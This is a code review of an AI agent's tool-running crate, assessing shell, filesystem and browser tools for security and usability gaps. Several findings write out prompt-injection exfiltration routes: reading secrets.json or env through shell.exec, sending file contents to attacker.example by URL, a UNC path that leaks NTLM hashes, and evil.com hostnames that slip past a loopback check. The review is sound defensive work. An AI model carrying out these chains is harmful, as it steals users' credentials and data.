# Guest & Tools — review

**Reviewed:** every line of `crates/botroster-guest/` — `src/tools.rs` (1121), `src/browser.rs` (944),
`src/client.rs` (338), `src/main.rs` (223), `src/lib.rs` (143) — plus its four test files
(`browser.rs`, `isolation.rs`, `refused.rs`, `shell_timeout.rs`, 1089 lines). Read for context:
`CLAUDE.md`, `CONTRIBUTING.md`, `docs/SPEC.md` headings, and, to check what the shipped defaults
actually are, `crates/botrosterd/src/policy.rs:118-181`, `crates/botroster-cli/src/up.rs:270-340`,
`crates/botroster-cli/src/config.rs:70-90`. No browser was launched and no test suite was run.

**Verdict:** The filesystem confinement is the most carefully-built thing in the crate — the
dangling-symlink walk in `Workspace::resolve` is genuinely correct where most implementations are
not — and it is also the wrong place to have spent that care, because `shell.exec` sits beside it
reading `~/.botroster/secrets.json` in one command and the crate's own module doc still claims
"everything it can reach on the filesystem is bounded by `tools::Workspace`" (`src/lib.rs:5`). The
containment story is weakest exactly where the project believes it is strongest: `isolation.rs`
proves no *crate* edge to `botrosterd` and then panics with "this is the reason a prompt injection
cannot exfiltrate a credential", while `botroster up` runs hub, secret store and guest in one process
whose environment every `shell.exec` child inherits. On the product side, the browser driver is a
real differentiator in ambition and not yet in capability: it drives one tab of one browser with no
tabs, no iframes, no uploads, no downloads, no dialog handling and no way to wait for anything, and
— the defect that costs the most turns — it hands the model `document.body.innerText` while
requiring CSS selectors to act, so the model must guess the selectors for a page it has only ever
seen as a wall of text. A competent agent will fail ordinary web tasks here for reasons that have
nothing to do with the model.

## Findings

### F-GT1 — `shell.exec` reads the credentials the isolation invariant exists to protect
`P0` · `reach: all users` · `crates/botroster-guest/src/tools.rs:637-667`

**What is true now.** `shell.exec` builds `sh -lc <command>` (or `cmd /C`), sets
`current_dir(ws.root())`, and spawns it. `current_dir` is the only confinement applied: the command
string is arbitrary and the child runs as the user with the parent's full environment, because
`tokio::process::Command` inherits it and nothing here calls `.env_clear()` or `.env_remove()`.

Two concrete reachable secrets, and the model provider key is reachable by whichever route the
install used. `resolve_key` (`crates/botroster-cli/src/config.rs:346-363`) tries
`std::env::var("XAI_API_KEY")` first and falls back to the secret store. `botroster up` starts the
hub, the secret store and the guest in a single process (`crates/botroster-cli/src/up.rs:275-325` —
`hub_from_home` then `tokio::spawn(botroster_guest::run_supervised(...))`), so on an install that
exported the variable — the documented primary path — the shell child inherits it and `env` prints
it. On an install that stored the key instead, the credential store is a mode-0600 file owned by the
same user at `home/secrets.json` (`crates/botrosterd/src/secrets.rs:111`), and
`cat ~/.botroster/secrets.json` reads it. There is no configuration in which neither works.

`crates/botroster-guest/tests/isolation.rs:118-131` panics with: *"the guest can now reach the
credential store… `botrosterd::secrets` holds the tokens in plaintext, and the guest is the side that
runs model-chosen tool calls against untrusted pages. Keeping those apart is not a convention; it is
the reason a prompt injection cannot exfiltrate a credential."* That stated purpose is not achieved.
The test proves a property of `Cargo.toml`, not of the guest.

The crate knows this threat model — `refuse_control_plane_home` (`tools.rs:135-168`) reasons about
it in detail and defends exactly one instance of it, `fs.read` on a workspace that happens to be the
home. The same argument applies verbatim to `shell.exec` on any workspace, and is not made.

Two aggravating details in the same lines. `sh -lc` is a **login** shell: it sources
`/etc/profile` and `~/.profile`, so the child's environment is the inherited parent secrets *plus*
whatever the login profile exports, and a profile containing a `cd` moves the command out of the
`current_dir(ws.root())` that is the only confinement `shell.exec` has. Profile banners also land in
the captured `stdout` the model parses.

**Why it matters.** This is where a prompt injection cashes out. `shell.exec` is `ask` in the
shipped policy (`crates/botrosterd/src/policy.rs:130`), so there is a human in the loop — but the
approval card shows a command, and a person approving `npm test` or `cargo build` is not approving
the postinstall script that reads `secrets.json`. `Rule::allow("shell.exec")` is a documented
configuration (`crates/botroster-cli/src/config.rs:696`), and on that account the chain is silent.
The gap between what `isolation.rs` promises and what ships is the problem: a reviewer who reads
that test believes the boundary holds.

**The durable fix.** The invariant has to be enforced by the OS, not by the dependency graph. Two
structural moves, in order of what they buy: (1) `shell.exec` clears the environment and
reconstructs a minimal allowlist (`PATH`, `HOME`, `LANG`, `TERM`) rather than inheriting — this is
one call and closes the env half completely; (2) the guest runs as a different OS user, or in its
own process with the secret store unreadable to it, so that `botroster up` stops being a single
process where the shell child is a sibling of the tokens. Until (2), `isolation.rs`'s panic message
should be rewritten to claim only what it proves, and `src/lib.rs:5` ("Everything it can reach on
the filesystem is bounded by `tools::Workspace`") is false as written and should say "`fs.*` is
bounded by `Workspace`; `shell.exec` is not bounded at all."

**How to prove it.** A test beside `isolation.rs`: write a marker into `<home>/secrets.json` and set
a marker env var on the guest process, then call `shell.exec` with `cat` and with `env` and assert
neither marker appears in the captured output. It fails today on both counts. A second test asserts
`sh -lc` does not re-enter a login profile: point `HOME` at a temp dir containing a `.profile` that
echoes a marker and `cd`s away, then assert the marker is absent from `stdout` and that `pwd` is
still the workspace root.

**Also in this file.** `check_url` (`src/main.rs:85-96`) decides "loopback" with
`hub_url.contains("localhost") || contains("127.0.0.1")`. `ws://127.0.0.1.evil.com/v1/tools` and
`ws://evil.com/?h=localhost` both pass, so the plaintext refusal — whose whole purpose is to stop
the bearer crossing the network in the clear — is bypassed by a registrable hostname. The tests at
`src/main.rs:203-222` only exercise the happy path. Parse the URL and test the host, not the string.

### F-GT2 — Chrome runs with `--no-sandbox`, justified by a comment claiming isolation the project says it does not have
`P0` · `reach: all users` · `crates/botroster-guest/src/browser.rs:200-203`

**What is true now.** The browser is launched with `--no-sandbox`, unconditionally, under the
comment *"The guest is already a sandbox; Chrome's own sandbox needs privileges a container usually
will not have."* `CLAUDE.md:104-109` states the opposite as a standing rule: *"Today's guest is an
ordinary process running as the user — not a VM, not a container… Do not write documentation,
comments or UI copy that implies isolation the project does not have."*

**Why it matters.** The renderer sandbox is the last boundary between a malicious web page and the
user's account, and this product's entire purpose is to point that renderer at pages chosen by an
adversary-influenced model. With `--no-sandbox`, a renderer exploit executes as the user, next to
`~/.ssh` and `~/.botroster/secrets.json`, with nothing behind it. The comment is not just wrong copy —
it is the reasoning that made the flag look safe to add, so the copy and the defect are the same
thing. It also survives review precisely because it reads like a considered decision.

**The durable fix.** Sandbox by default; add `--no-sandbox` only where it is actually forced, and
say why at the call site. The real constraint is narrow — Chrome refuses to start as UID 0, and some
container configurations lack `CLONE_NEWUSER` — so the flag belongs behind a detection (running as
root, or a launch that failed with the sandbox error and is being retried once) or behind an
explicit `BOTROSTER_BROWSER_NO_SANDBOX` opt-in that logs a warning, not in the unconditional argument
list. Delete the comment either way.

**How to prove it.** A test that reads back the launch arguments (or the `chrome://version` command
line via CDP) and asserts `--no-sandbox` is absent when the process is not running as root. It fails
today on every platform. The CLAUDE.md rule additionally deserves a grep-based test over
`crates/**/*.rs` for comments asserting the guest is a sandbox or container, since this is the
second-order failure: the rule exists and nothing enforces it.

### F-GT3 — the allow-listed tools are larger primitives than their approval implies
`P0` · `reach: all users` · `crates/botroster-guest/src/tools.rs:462-470`, `:584-597`

**What is true now.** `browser.open` accepts any `http://` or `https://` URL. The scheme check is
the only check: no host allowlist, no distinction between "navigate within the site I am working on"
and "make an arbitrary outbound request with data in the query string". In the shipped default
policy it is `Rule::allow("browser.open")` (`crates/botrosterd/src/policy.rs:132`), alongside
`Rule::allow("fs.read")` and `Rule::allow("browser.read")`, under the comment "Reading the web is
browsing".

So the full chain `fs.read` → `browser.open https://attacker.example/?q=<contents>` requires **zero
approval prompts**. The same tool reaches `http://127.0.0.1:8443/…` (the hub the guest is
forbidden to depend on), `http://169.254.169.254/…` (cloud metadata), and anything else bound to
loopback on the host — an unapproved SSRF primitive from inside the guest.

`browser.screenshot` is the same shape on the write side: `Rule::allow` (`policy.rs:135`) while
`fs.write` is `Rule::ask` (`policy.rs:129`), a model-chosen `path`, and `create_dir_all(parent)` +
`fs::write` with no existence check (`tools.rs:592-595`). It silently overwrites any file in the
workspace with PNG bytes, with no prompt. The module doc (`tools.rs:17-22`) reasons carefully about
this tool writing *outside* the root through a broken link, and never addresses the unapproved
overwrite *inside* it.

**Why it matters.** "Reading the web is browsing" is true of `browser.read` and false of
`browser.open`: a GET with attacker-chosen bytes in the path is a write to the attacker's server.
This is the cheapest exfiltration channel in the product and the only one that needs no human at
all. The policy engine already supports argument matching — `Rule::deny(...).when("path", "/etc/*")`,
exercised at `policy.rs:366` — so the capability to gate this exists and the default does not use
it; but the guest also gives it nothing better to gate on than a single opaque `url` string.

**The durable fix.** Split the primitive so the policy can express the distinction the comment is
trying to make. A navigation that stays on the origin the session is already on is one thing; a
navigation to a new origin is another, and should be a separately-named tool (or carry an explicit
`origin` argument the policy can pattern-match) so `ask` on cross-origin navigation is expressible
without making browsing unusable. Refuse loopback, link-local and RFC1918 destinations at the guest
unless explicitly configured — the guest has no legitimate reason to browse the host it runs on.
For `screenshot`, either refuse to overwrite an existing file (making it a create-only primitive,
which is what its approval assumes) or move it to `ask`.

**How to prove it.** Three tests. `browser.open` to `http://127.0.0.1:<hub port>/v1/tools` is
refused — it succeeds today. A `Policy::default()` evaluation of `fs.read` followed by
`browser.open` with a foreign host returns at least one `RequireApproval` — it returns two `Allow`s
today. And `browser.screenshot` onto a path holding existing bytes leaves them intact — it does not
today.

### F-GT4 — the model can act on the page but has no way to see what it can act on
`P0` · `reach: most users` · `crates/botroster-guest/src/browser.rs:394-407`

**What is true now.** `browser.read` returns `document.body.innerText`, capped at 20 000 bytes
(`tools.rs:481-489`). `browser.links` returns up to 200 `{text, href}` pairs — `.slice(0,200)` at
`browser.rs:404`, with no `truncated` flag, unlike every other capped tool in the crate. Those are
the only two ways a model can perceive a page.

`browser.click` and `browser.fill` require a **CSS selector**. Nothing in the perception tools emits
one. `innerText` carries no element identity, no `id`, no `name`, no `role`, no input placeholders,
no button labels that are rendered from an attribute, and no indication that a form exists at all.
The one pixel view, `browser.frame`, is deliberately withheld from the catalogue
(`tools.rs:368-378`) on the correct grounds that a text model cannot use base64 JPEG — which leaves
a text model with no view of structure whatsoever. `innerText` also excludes every iframe's content,
silently.

So the working loop is: read a wall of text, guess `input[name="q"]`, receive `nothing on the page
matches \`input[name="q"]\`` (`browser.rs:62`), guess again. The error names the selector that
failed and nothing about what would have worked.

**Why it matters.** This is the difference between a browser tool that demos and one that completes
tasks. Every competitive agent browser (Playwright MCP, Claude in Chrome, browser-use) returns a
structured snapshot — an accessibility tree with stable per-element references — and has the act
tools take those references, so perception and action share one coordinate system. Here they share
nothing, and the mismatch multiplies every other browser defect in this report: each wrong guess is
a turn, and `browser.click`/`browser.fill` are `ask` (`policy.rs:141-142`), so each wrong guess is
also a prompt the person has to read and approve. A ten-field form is not reachable this way.

**The durable fix.** Add a snapshot tool that walks the accessibility tree (CDP
`Accessibility.getFullAXTree`, or a `Runtime.evaluate` over interactive elements as a first cut)
and returns, for each actionable node, a stable `ref`, its role, its accessible name, its value, and
its enabled/visible state — then make `click`, `fill`, `select` and the rest accept a `ref` as an
alternative to a selector, resolved through the snapshot the model was actually shown. Selectors
stay for the cases a `ref` cannot express. `links` gets a `truncated` flag and an offset in the same
change.

**How to prove it.** A live test against a fixture page with a labelled form: assert that the output
of the perception tools alone contains enough to construct a successful `fill` — concretely, that
every element `fill` can target appears in the snapshot with an identifier `fill` accepts. Today the
snapshot does not exist, so the test cannot even be written against the current surface, which is
the finding.

### F-GT5 — a click that navigates returns stale state, or a spurious error
`P1` · `reach: most users` · `crates/botroster-guest/src/tools.rs:500-511`

**What is true now.** `browser.click` calls `b.click(&sel)` — a `Runtime.evaluate` of
`e.click()` (`browser.rs:409-418`) — and then immediately calls `b.info()`, a second
`Runtime.evaluate`. There is no `await_ready()` between them, unlike `navigate`, which does call it
(`browser.rs:352-356`).

For the most common click in web automation — a link or a submit button — the JS returns as soon as
the navigation is *scheduled*. The `info()` that follows therefore lands in one of three states: the
old execution context (returning the previous page's `url` and `title` as if the click had done
nothing), a context being torn down (CDP answers `Cannot find context with specified id` /
`Execution context was destroyed`, which becomes `ToolError::Failed` and reports the click as
having failed), or occasionally the new page. Which one is a race.

There is also no `browser.wait` of any kind, and `await_ready` itself (`browser.rs:363-379`) accepts
`readyState === "interactive"` and returns `Ok(())` on timeout after a `tracing::warn!` the model
never sees — so even the navigate path returns before a client-rendered app has painted anything.

**Why it matters.** A tool that reports failure for an action that succeeded is worse than one that
fails outright, because the model's recovery is to retry — and a retried submit button is a
double-submitted form, a double-sent message, a double-charged cart. When it instead returns stale
state, the model reads the previous page's title, concludes the click did nothing, and clicks again.
Both branches produce duplicate actions on live web apps that this product's approval prompts have
already blessed once.

**The durable fix.** Make navigation a first-class part of every acting tool's contract rather than
a thing that happens between calls: subscribe to `Page.frameNavigated`/`Page.loadEventFired` before
dispatching the click, and after dispatch either settle the navigation (with the same deadline
`navigate` uses) or confirm none started, then report `{navigated: bool, url, title}` from whichever
context is current. Separately, add an explicit `browser.wait_for` taking a selector, a text string,
or network-idle, so the model has a way to say "wait" that is not `shell.exec sleep`.

**How to prove it.** A live test: serve a page with a link to a second page, `browser.click` it, and
assert the returned `url` is the second page's. It is the first page's, or an error, today. A second
test on a fixture that navigates after a 300 ms timer asserts the same.

### F-GT6 — the input tools report success they did not achieve
`P1` · `reach: most users` · `crates/botroster-guest/src/browser.rs:420-435`

**What is true now.** `fill` runs `e.focus(); e.value=<text>; dispatchEvent(input); dispatchEvent(change)`
and returns `'ok'` whenever `querySelector` found *anything*. On a `contenteditable` div, a custom
element, or any node without a `value` property, `e.value = "..."` creates an expando property, the
events fire against an element that ignores them, the tool returns
`{"filled": sel, "chars": N}` and **nothing was typed**. Gmail's compose box, Slack's message box,
Notion, and most rich-text and chat inputs on the web are `contenteditable`.

`click` (`browser.rs:409-418`) has the same shape: `e.click()` on a disabled button, a
zero-size element, or one covered by a modal overlay dispatches an event and returns `'ok'`.

`type_text` (`browser.rs:599-614`) contradicts its own doc comment. Lines 591-598 justify the
per-character round trip on the grounds that `insertText` "bypasses `keydown` entirely, so… a field
that blocks non-numeric keys sees the text appear without ever seeing a key". But the events it
sends set only `text`/`unmodifiedText`/`key` and never `windowsVirtualKeyCode` or `code`, so the
page's handler reads `event.keyCode === 0` and `event.which === 0` — and a field that filters on
`keyCode`, which is exactly the case the comment names, rejects every character.

**Why it matters.** A silent false success is the most expensive error class an agent tool can have:
the model proceeds, submits an empty form, reports the task done, and the person discovers it later.
Every other failure in this report at least tells the model something. And `fill`/`type` are `ask`,
so a human approved an action that did not happen.

**The durable fix.** The acting tools verify their own postcondition and return it. `fill` branches
on the element: `value` for form controls, `textContent` plus `beforeinput`/`input` for
`contenteditable`, and reads the value back afterwards, returning an error naming the element's tag
and role when the read-back does not match. `click` checks that the element is visible, enabled and
the topmost node at its centre point before dispatching, and reports which of those failed.
`type_text` sends complete key events including `code` and `windowsVirtualKeyCode`. All three are
the same principle: report what the page ended up in, not that a call returned.

**How to prove it.** Three live tests against a fixture page. `fill` on a `contenteditable` div then
`text_of("div.editor.textContent")` equals the text — it is empty today, while the tool reported
success. `click` on a `disabled` button returns an error — it returns `ok` today. `type_text` into a
field whose `keydown` handler records `e.keyCode` records a non-zero code — it records 0 today.

### F-GT7 — a JavaScript dialog has no handler anywhere in the crate, and no test
`P1` · `reach: most users` · `crates/botroster-guest/src/browser.rs:279`

**What is true now.** `attach` enables the Page domain (`Page.enable`, `browser.rs:279`). A grep of
the entire crate for `handleJavaScriptDialog` and `javascriptDialog` returns nothing, and the live
browser suite (`tests/browser.rs`, 697 lines, 20 tests) has no test involving `alert`, `confirm`,
`prompt` or `beforeunload`.

Under CDP, enabling the Page domain makes the client responsible for dialogs: Chrome emits
`Page.javascriptDialogOpening` and waits for `Page.handleJavaScriptDialog`. (Puppeteer auto-dismisses
dialogs when no listener is registered precisely because the raw protocol does not.) If that holds
in `--headless=new`, every subsequent `Runtime.evaluate` blocks, so each browser tool call waits the
full `CALL_TIMEOUT` of 60 s (`browser.rs:38`) and then fails — and `is_alive()` (`browser.rs:289`)
reads the *websocket*, which is still fine, so `Context::browser()` never replaces the handle
(`tools.rs:66-84`). The session stays wedged for the life of the guest, at 60 s per call.

I could not launch a browser to observe this. What I can assert without one: the handler is absent,
the domain is enabled, and there is no test either way. `beforeunload` — "Leave site? Changes you
made may not be saved" — fires on ordinary navigation away from a form the agent just filled, so
this is not an exotic page.

**Why it matters.** The failure mode is a permanently unusable browser with no error that names the
cause, on a class of page the agent's own actions provoke. `CONTRIBUTING.md` requires that an
assumption gets a test that would fail if it were false; the assumption "dialogs do not need
handling" is load-bearing here and untested, which is the durable part of this finding regardless of
how `--headless=new` actually behaves.

**The durable fix.** Subscribe to `Page.javascriptDialogOpening` in `attach`, and answer every
dialog with `Page.handleJavaScriptDialog` — dismiss by default, and record the dialog's type and
message so the next tool result can tell the model a dialog appeared and what it said. Expose
`browser.dialog(accept|dismiss, text?)` for the flows that need to accept one. Independently,
`is_alive` should reflect whether the browser is *answering*, not whether the socket is open, so a
wedged session is replaceable.

**How to prove it.** A live test: navigate to a data-free fixture whose `onload` calls `alert("x")`,
then call `browser.read` and assert it returns within a second or two with the page text. Today it
either hangs to the 60 s timeout or it does not — and either way the test does not exist, so the
behaviour is unknown to the project.

### F-GT8 — one browser, one tab, shared by every Bot and every concurrent tool call
`P1` · `reach: most users` · `crates/botroster-guest/src/tools.rs:66-84`

**What is true now.** `Context` holds a single browser (`tools.rs:46-54`), and one `Context` is
shared by the whole guest — `Arc::new(Context::new(...))` at `up.rs:314` and `main.rs:154`.
`Context::browser()` holds the mutex only long enough to clone the `Arc` out, so it serialises
nothing. `handle_request` spawns every `tool_call_request` on its own task with no limit and no
ordering (`client.rs:257-262`). And `attach` binds the CDP session to exactly one page target picked
once at connect time (`browser.rs:226`, `page_target` at `:748-769`); nothing tracks
`Target.targetCreated`, so a tab opened by `target="_blank"`, `window.open`, or an OAuth popup is
invisible and unreachable — the agent keeps driving the page it left.

**Why it matters.** Two distinct failures. The product premise is "persistent, named AI teammates
sharing one durable computer" — but they share one *tab*: two Bots working concurrently interleave
navigations on the same page, and because the profile is durable and holds signed-in sessions
(`browser.rs:13-18`), Bot A reads Bot B's authenticated page and the bleed persists across restarts.
Second, single-target attachment breaks a large fraction of real web work outright. OAuth and SSO
consent open a popup. "Open in new tab" is how search results are used. Clicking a PDF link opens a
viewer tab. In every case the tool set reports success on a page where nothing changed.

**The durable fix.** Track targets rather than binding one: attach at the browser endpoint,
subscribe to `Target.targetCreated`/`targetDestroyed`, keep a session per page, and add
`browser.tabs` / `browser.switch` / `browser.close_tab` so the model can see and choose. Route each
tool call through an explicitly-selected active target rather than an implicit one. For the
multi-Bot case, make the unit of browser ownership the session rather than the guest — one context
(a CDP `BrowserContext`, cheap and profile-backed) per bound session, so concurrent Bots do not
share a viewport, and serialise calls within one context.

**How to prove it.** A live test clicking a `target="_blank"` link and asserting the subsequent
`browser.read` returns the new page's text — it returns the old page's today. A second test binds
two sessions, navigates each to a different URL concurrently, and asserts each session's
`browser.info` reports its own URL; today both report whichever landed last.

### F-GT9 — the filesystem tools cannot handle a file or directory of ordinary size
`P1` · `reach: most users` · `crates/botroster-guest/src/tools.rs:616-635`

**What is true now.** `fs.read` takes a `path` and nothing else: no offset, no length, no line
range. It calls `std::fs::read` — the *entire* file into memory — decodes it, and then truncates to
the first 20 000 bytes (`OUTPUT_BYTE_LIMIT`, `tools.rs:35`), setting `truncated: true`. There is no
way to fetch byte 20 001. `fs.write` takes whole `contents` only: no append, no offset, no edit, no
patch. `fs.list` has **no cap at all** — it builds a JSON array of every entry in a directory, sorts
it, and returns it.

The composition is the problem: a 30 KB source file cannot be read completely, and therefore cannot
be safely rewritten, because the only write primitive requires the model to reproduce the whole
file from a copy it was never given. Truncation is also from the head, which is the wrong end for
the single most common large file an agent reads — a log.

`std::fs::read`, `std::fs::write`, `read_dir` and `create_dir_all` are all blocking calls made
directly on the tokio runtime (`tools.rs:595`, `:603`, `:619`, `:631-633`), so a large read or a
slow volume stalls a worker thread rather than yielding.

**Why it matters.** This is the floor on what the agent can do with the durable computer that is the
product's whole premise. Any file over 20 KB is effectively read-only-and-partially-visible: a
package-lock, a CSV, a log, a component file, a config. A model that reads 20 KB of a 30 KB file and
then writes what it believes the file should be silently destroys the last third. `fs.list` on a
build output or a `node_modules` is a multi-megabyte payload with no truncation flag — the one place
in the crate where a cap was forgotten, in the tool most likely to hit a huge result.

**The durable fix.** Give the read path a cursor and the write path an edit: `fs.read` accepts
`offset`/`limit` (bytes or lines) and returns the file's total size plus the next offset, so paging
is expressible and the model knows what it has not seen; add a `tail` mode, since that is what logs
need. Add `fs.edit` taking an exact old/new string pair (the standard agent primitive) so editing a
large file does not require reproducing it. Cap `fs.list` with the same `truncated` convention the
other tools use, and add a `stat` so a model can check size before reading. Move all filesystem
calls to `tokio::fs` or `spawn_blocking`.

**How to prove it.** Write a 60 KB file, then assert that a sequence of `fs.read` calls can recover
every byte — impossible today. Assert `fs.list` on a directory of 50 000 entries returns a bounded
payload with `truncated: true` — it returns all 50 000 today.

### F-GT10 — `shell.exec` has an unbounded output buffer, an unbounded timeout, and no cancel path
`P1` · `reach: some users` · `crates/botroster-guest/src/tools.rs:669-686`

**What is true now.** Three compounding gaps in one tool.

*Output.* `cmd.output()` buffers all of stdout and stderr in memory with no limit; `cap()` is
applied afterwards, to the already-complete `String`. The doc comment at `tools.rs:32-34` describes
`OUTPUT_BYTE_LIMIT` as a cap on "captured process output… rather than returning a payload large
enough to blow a context window", which reads as a bound on capture and is only a bound on
presentation. A command that writes fast and long (`yes`, a runaway build, a `cat` of a large
binary) grows the buffer until the process dies — and under `botroster up` that process is also the
hub and the desktop app.

*Timeout.* `timeout_secs` is taken with `as_u64()` and passed straight to `Duration::from_secs`
(`tools.rs:639-643`). The advertised schema says `"maximum": 3600` (`tools.rs:416`), but schemas are
advisory and nothing clamps it, so a model that supplies a very large value gets an effectively
unbounded command.

*Cancellation.* There is none. `handle_notification` handles only `SessionUnbind` and logs the rest
at debug (`client.rs:211-218`), though `Method::ToolCancel` exists in the protocol
(`botroster-proto/src/lib.rs:243`). `run_tool` is spawned with its `JoinHandle` dropped
(`client.rs:260-262`), so nothing holds a way to abort it. And when the hub socket drops, `run`
returns and `run_supervised` reconnects (`client.rs:176-208`, `:91-122`) while every in-flight tool
task keeps running against a dead channel — which matches the symptom already recorded in
`.claude/ux-loop/BACKLOG.md:262` ("silent on the open `shell.exec`").

**Why it matters.** Together these mean a single tool call can consume the machine with no way to
stop it short of killing the process — and the person watching has an approval UI that can say yes
but not "stop". The memory case takes the hub down with it in the default single-process
deployment.

**The durable fix.** Stream the child's output through a bounded reader that stops copying at a
hard ceiling (an order of magnitude above the presentation cap) and kills the child when it is
exceeded, reporting `truncated` with the reason — capture bounded at the source, not at the end.
Clamp `timeout_secs` to the advertised maximum in code and reject out-of-range values with a message
naming the bound, on the principle that the JSON schema is documentation and the guest is
enforcement. Retain each `run_tool` handle in a map keyed by `call_id`, abort on cancel, and abort
all of them when the connection drops.

**How to prove it.** `shell.exec` a command producing 200 MB on stdout and assert the guest's RSS
stays bounded and the result says `truncated` — it does not today. `timeout_secs: 10_000_000` is
rejected or clamped to 3600 — it is honoured today. And a cancel arriving mid-command stops it — no
path exists today.

### F-GT11 — a timed-out command's children survive, and the test that guards it cannot see them
`P1` · `reach: some users` · `crates/botroster-guest/src/tools.rs:660-667`

**What is true now.** `kill_on_drop(true)` reaps the shell the guest spawned, and the comment at
`tools.rs:663-666` says so honestly: *"A grandchild the shell spawned and detached can still outlive
it: killing a whole process tree needs a job object or a process group, and this workspace forbids
`unsafe`."*

The problem is the test. `tests/shell_timeout.rs` is named
`a_timed_out_command_does_not_keep_running`, and its command is
`sleep 4 && echo done > marker` / `ping -n 5 127.0.0.1 > nul & echo done > marker`
(`shell_timeout.rs:20-27`). In both, the marker is written by **the shell itself**, so killing the
shell is sufficient and the test passes — while on Windows the `ping` grandchild keeps running,
which is the exact case the test's name denies. The real shapes (`npm test`, `cargo build`,
`python train.py`) are all shell-spawns-a-child, and none is covered.

**Why it matters.** `CONTRIBUTING.md` asks that a test fail if its claim is false; this one passes
when its claim is false, so the project believes a property it does not have. Operationally, a
timed-out command leaves a build or a server holding the workspace and its ports while the model is
told it stopped — and an agent's response to a timeout is to retry, so the orphans accumulate one
per attempt, which is the harm the comment set out to prevent.

**The durable fix.** Kill the tree, not the process. `#![forbid(unsafe_code)]` is a crate-local lint
and does not extend to dependencies, so the stated blocker is not one: on Unix,
`std::os::unix::process::CommandExt::process_group(0)` is safe and stable and gives the child its
own group, which a vetted wrapper (`nix::sys::signal::killpg`) then signals; on Windows the child
goes in a Job object with `JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`, via a maintained crate rather than
raw FFI. Either way the reaping becomes a property of the group, not of one handle.

**How to prove it.** Change the fixture so the *grandchild* writes the marker —
`sh -c 'sleep 4 && echo done > m' &` on Unix, `start /b cmd /c "timeout 5 & echo done > m"` on
Windows — and assert the marker never appears. It appears today, which is the same assertion the
current test makes and cannot reach.

### F-GT12 — the escape check touches the filesystem before rejecting, and reports every I/O error as an escape
`P1` · `reach: some users` · `crates/botroster-guest/src/tools.rs:230-243`

**What is true now.** `resolve` collapses `..` lexically, and then — *before* any comparison against
the root — walks the path calling `std::fs::symlink_metadata` on each ancestor and finally
`canonicalize`. The root check at `tools.rs:248` happens last.

Two consequences.

*The check performs I/O on an attacker-supplied path it is about to refuse.* On Windows, a UNC path
(`\\attacker.example\share\x`) is `is_absolute`, so `symlink_metadata` reaches out over SMB — and
Windows will attempt NTLM authentication to that host, leaking the user's NTLMv2 hash, before
`resolve` returns `Escape`. `fs.read` is `Rule::allow` in the shipped policy
(`crates/botrosterd/src/policy.rs:127`), so this needs no approval; the model sees only "path escapes
the workspace" and has no idea anything left the machine. The same shape is a hang on any path on a
dead network mount or an unresponsive autofs, in a blocking call on the async runtime.

*Every I/O failure becomes `Escape`.* `canonicalize().map_err(|_| ToolError::Escape(raw))` at
`tools.rs:241-243` converts permission-denied, path-too-long, a stale mount, and a genuine transient
error into "path escapes the workspace: <path>". That message is false for a path plainly inside the
workspace, and it is a dead end: the model's only sensible response to "escapes the workspace" is to
try somewhere else, so it will never retry, and the person debugging is told the confinement
rejected a path the confinement had no opinion about. (The `Io` variant has the mirror-image
problem: `std::io::Error`'s Display carries no filename, so `fs.read` on a missing file returns
`io error: No such file or directory (os error 2)` with the path stripped out.)

**Why it matters.** A confinement check should decide out-of-bounds using only the string and the
root, and should reach the filesystem only for paths it has already decided are in-bounds. Doing it
the other way makes the check itself a side-effecting primitive an injection can aim outward — and
on Windows that side effect is a credential.

**The durable fix.** One reordering: after the lexical pass, if `lexical` does not start with the
root, refuse immediately, with no filesystem call — that alone removes the UNC and dead-mount
reach, since both are refused on their prefix. Only then run the symlink walk, which exists to catch
the in-bounds-looking paths that leave via a link. Second, stop collapsing: a `canonicalize` failure
that is not a boundary violation is `ToolError::Io`, carrying the path and the underlying error, so
the model learns whether to retry. Add the path to the `Io` variant's message throughout.

**How to prove it.** On Windows, `ws.resolve(r"\\127.0.0.1\share\x")` returns `Escape` without a
network round trip — measurable as a wall-clock assertion against a black-holed address (it takes
seconds today). And `resolve` on a real in-workspace directory whose permissions deny traversal
returns `Io`, not `Escape` — it returns `Escape` today.

## Tool-surface gaps

Capabilities a competitive agent browser/computer product needs and this guest does not have. Most
severe first; several are the missing halves of findings above.

1. **Tabs and windows** — one page target is bound at connect time (`browser.rs:226`); OAuth
   popups, `target="_blank"` results and PDF viewer tabs are invisible and unreachable. This is the
   single largest cause of "the agent silently did nothing" in real web work.
2. **Iframes** — nothing in the crate addresses a frame. Stripe fields, reCAPTCHA, consent banners,
   embedded editors and most third-party widgets are neither readable by `browser.read` nor
   clickable by `browser.click`, and the model is never told content is missing.
3. **Waiting** — no `wait_for(selector|text|network-idle)`; `await_ready` accepts `interactive` and
   gives up silently (`browser.rs:363-379`), so a client-rendered app is read empty and the only
   workaround is `shell.exec sleep`, which needs an approval prompt.
4. **File upload** — no `DOM.setFileInputFiles`. "Attach the report to this form" cannot be done at
   all, and the workspace is full of files a user would want to attach.
5. **Downloads** — no `Page.setDownloadBehavior`. A clicked download goes to the browser's default
   directory (outside the workspace, where `fs.read` cannot reach it) or nowhere. "Download the CSV
   and summarise it" is a canonical task and is impossible.
6. **Dialogs** — no accept/dismiss (F-GT7), so `confirm()`-guarded deletes and `beforeunload` prompts
   cannot be answered even when the user wants them answered.
7. **History** — no back, forward or reload. The only recovery from a wrong click is re-navigating
   from the top, re-entering any form state on the way.
8. **`<select>` and pickers** — `fill` sets `.value`, which cannot open a native select, cannot
   enumerate options the model has never seen, and does nothing for the custom dropdowns that have
   replaced them.
9. **Scrolling within an element** — `scroll` dispatches a wheel event at a default point of (10,10)
   (`tools.rs:553-554`); an inner scroll container, a virtualised list or a modal body cannot be
   scrolled, and there is no `scrollIntoView` before acting.
10. **Session control** — no way to clear cookies, sign out, or start from a clean profile. The
    profile is durable and shared (`browser.rs:13-18`), so a sign-in to the wrong account is
    permanent unless someone deletes the directory by hand.
11. **Filesystem verbs** — no delete, move, copy, mkdir, stat, glob or content search. All of them
    are reachable only through `shell.exec`, which is `ask` by default, so on a locked-down account
    the agent cannot delete a file it just created.
12. **An escape hatch** — no `browser.eval`. With a fixed verb set this small and no structural view
    of the page, there is no way for a capable model to route around any of the gaps above.

## What I could not check

- **Nothing was observed against a real browser** (the brief forbade launching one), so every CDP
  claim here is read from the protocol and the code rather than seen. Three specifically want a live
  check: whether `--headless=new` holds a dialog for the client or auto-dismisses it (F-GT7); which
  of the three race outcomes `browser.click` produces in practice (F-GT5); and whether
  `Runtime.evaluate`'s `innerText` picks up shadow-DOM content, which would slightly narrow F-GT4.
